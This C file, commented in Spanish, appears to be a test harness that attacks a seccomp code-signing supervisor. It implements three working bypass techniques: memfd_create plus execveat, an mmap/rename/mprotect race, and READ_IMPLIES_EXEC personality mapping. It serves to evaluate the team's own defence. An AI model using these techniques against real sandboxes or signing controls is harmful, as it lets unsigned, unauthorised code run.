/* Harness de ataques para el experimento VALOR del #9 (supervisor seccomp).
 * Corre BAJO fnbr-supervise. Cada modo intenta ejecutar/mapear codigo no
 * firmado por una via distinta. Exit 0 = ataque BLOQUEADO; !=0 = codigo
 * NO firmado llego a correr (BYPASS) salvo que se indique.
 *   memfd-fexecve <elf>   memfd_create + write + fexecve (estatico)
 *   mprotect-toctou <uns> <signed>  mmap RW de uns, swap a signed, mprotect RX
 *   dlopen-ish no aplica (sin libdl). */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define PAGE 4096UL
#define DOWN(x) ((x) & ~(PAGE - 1))
#define UP(x) (((x) + PAGE - 1) & ~(PAGE - 1))

static int do_memfd(const char *path){
    int src=open(path,O_RDONLY); if(src<0){perror("open");return 1;}
    struct stat st; fstat(src,&st);
    char *buf=malloc(st.st_size); if(read(src,buf,st.st_size)!=st.st_size){return 1;}
    int fd=syscall(SYS_memfd_create,"x",0U);
    if(fd<0){printf("memfd: errno=%d\n",errno);return 0;}
    if(write(fd,buf,st.st_size)!=st.st_size){return 1;}
    char *av[]={(char*)"x",NULL}, *ev[]={NULL};
    syscall(SYS_execveat,fd,"",av,ev,AT_EMPTY_PATH);
    printf("fexecve memfd: errno=%d (bloqueado)\n",errno);
    return 0;
}

/* mmap RW de 'uns', luego reemplaza el archivo 'uns' por el contenido de
 * 'signed' (rename), luego mprotect RX. Si el supervisor lee la RUTA en
 * mprotect vera el firmado y aprobara, pero las paginas tienen el codigo
 * NO firmado (MAP_PRIVATE copiado antes). exit 0=bloqueado, 9=BYPASS corrio. */
static int do_toctou(const char *uns,const char *sgn){
    int fd=open(uns,O_RDONLY); if(fd<0){perror("open uns");return 1;}
    /* leer entry del header para saltar a el */
    unsigned char hdr[64]; pread(fd,hdr,64,0);
    unsigned long entry=*(unsigned long*)(hdr+24);
    /* mapear el primer PT_LOAD ejecutable con mmap RW en su vaddr */
    unsigned short phnum=*(unsigned short*)(hdr+56);
    unsigned long phoff=*(unsigned long*)(hdr+32);
    unsigned short phentsize=*(unsigned short*)(hdr+54);
    for(int i=0;i<phnum;i++){
        unsigned char ph[56]; pread(fd,ph,56,phoff+(unsigned long)i*phentsize);
        unsigned int type=*(unsigned int*)(ph+0);
        unsigned int flags=*(unsigned int*)(ph+4);
        if(type!=1) continue; /* PT_LOAD */
        if(!(flags&1)) continue; /* buscamos el ejecutable (X) */
        unsigned long vaddr=*(unsigned long*)(ph+16);
        unsigned long off=*(unsigned long*)(ph+8);
        unsigned long filesz=*(unsigned long*)(ph+32);
        unsigned long memsz=*(unsigned long*)(ph+40);
        unsigned long a=DOWN(vaddr), len=UP(vaddr+memsz)-a;
        void *m=mmap((void*)a,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_FIXED_NOREPLACE,fd,DOWN(off));
        if(m==MAP_FAILED){printf("mmap RW: errno=%d\n",errno);return 3;}
        /* TOCTOU: ahora el path 'uns' pasa a tener el contenido firmado */
        if(rename(sgn,uns)!=0){perror("rename");}
        if(mprotect((void*)a,len,PROT_READ|PROT_EXEC)!=0){
            printf("mprotect RX: errno=%d (bloqueado)\n",errno);
            return 0;
        }
        /* si llegamos aca, paginas NO firmadas quedaron ejecutables */
        (void)filesz;
        long (*e)(void)=(long(*)(void))entry;
        long r=e();
        printf("TOCTOU entry=%ld (BYPASS: codigo no firmado ejecutado)\n",r);
        return 9;
    }
    printf("sin segmento X\n"); return 1;
}


#include <sys/personality.h>
/* personality(READ_IMPLIES_EXEC) + mmap(PROT_READ) de 'uns': el kernel agrega
 * PROT_EXEC, pero seccomp ve prot=PROT_READ y el supervisor no verifica.
 * exit 0=bloqueado, 9=BYPASS (codigo no firmado corrio). */
static int do_rie(const char *uns){
    if(personality(READ_IMPLIES_EXEC)==-1){printf("personality: errno=%d\n",errno);return 0;}
    int fd=open(uns,O_RDONLY); if(fd<0){perror("open");return 1;}
    unsigned char hdr[64]; pread(fd,hdr,64,0);
    unsigned long entry=*(unsigned long*)(hdr+24);
    unsigned short phnum=*(unsigned short*)(hdr+56);
    unsigned long phoff=*(unsigned long*)(hdr+32);
    unsigned short phentsize=*(unsigned short*)(hdr+54);
    for(int i=0;i<phnum;i++){
        unsigned char ph[56]; pread(fd,ph,56,phoff+(unsigned long)i*phentsize);
        if(*(unsigned int*)(ph+0)!=1) continue;
        unsigned long vaddr=*(unsigned long*)(ph+16), off=*(unsigned long*)(ph+8), memsz=*(unsigned long*)(ph+40);
        unsigned long a=DOWN(vaddr), len=UP(vaddr+memsz)-a;
        int prot=PROT_READ | ((*(unsigned int*)(ph+4)&2)?PROT_WRITE:0); /* nunca pedimos EXEC */
        void *m=mmap((void*)a,len,prot,MAP_PRIVATE|MAP_FIXED_NOREPLACE,fd,DOWN(off));
        if(m==MAP_FAILED){printf("mmap: errno=%d\n",errno);return 3;}
    }
    long (*e)(void)=(long(*)(void))entry;
    long r=e();
    printf("READ_IMPLIES_EXEC entry=%ld (BYPASS)\n",r);
    return 9;
}

int main(int argc,char**argv){
    setvbuf(stdout,NULL,_IONBF,0);
    if(argc<2){fprintf(stderr,"uso: harness modo args\n");return 1;}
    if(!strcmp(argv[1],"memfd-fexecve")&&argc==3) return do_memfd(argv[2]);
    if(!strcmp(argv[1],"mprotect-toctou")&&argc==4) return do_toctou(argv[2],argv[3]);
    if(!strcmp(argv[1],"read-implies-exec")&&argc==3) return do_rie(argv[2]);
    fprintf(stderr,"modo desconocido\n"); return 1;
}
